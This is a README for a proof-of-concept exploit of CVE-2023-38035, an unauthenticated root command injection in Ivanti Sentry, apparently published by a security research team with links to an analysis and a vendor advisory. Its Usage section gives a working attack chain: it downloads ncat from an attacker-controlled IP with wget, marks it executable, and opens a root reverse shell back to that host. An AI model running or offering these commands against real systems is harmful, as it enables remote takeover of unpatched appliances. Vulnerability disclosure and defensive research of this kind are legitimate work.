# CVE-2023-38035
POC for CVE-2023-38035 affecting Ivanti Sentry

## Technical Analysis
A technical root cause analysis of the vulnerability can be found on our blog:
https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive

## Summary
This POC abuses an unauthenticated command injection to execute arbitrary commands as the root user.

The execution context does not allow for command piping, and the system does not ship with easily abusable binaries, so commands can be chained to download a static ncat from somewhere like https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat.

## Usage
```plaintext
python3 CVE-2023-38035.py -u https://<target>:8443/ -c 'wget http://123.123.123.123:8000/ncat -O /tmp/ncat'
[+] Successfully executed command on target!
python3 CVE-2023-38035.py -u https://<target>:8443/ -c 'chmod +x /tmp/ncat' 
[+] Successfully executed command on target!
python3 CVE-2023-38035.py -u https://<target>:8443/ -c 'sudo /tmp/ncat 123.123.123.123 4444 -e /bin/sh'
[+] Successfully executed command on target!
```

![Shell](shell.png)

## Mitigations
Update to the latest version according to the instructions within the Ivanti Advisory
* https://forums.ivanti.com/s/article/KB-API-Authentication-Bypass-on-Sentry-Administrator-Interface-CVE-2023-38035?language=en_US

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

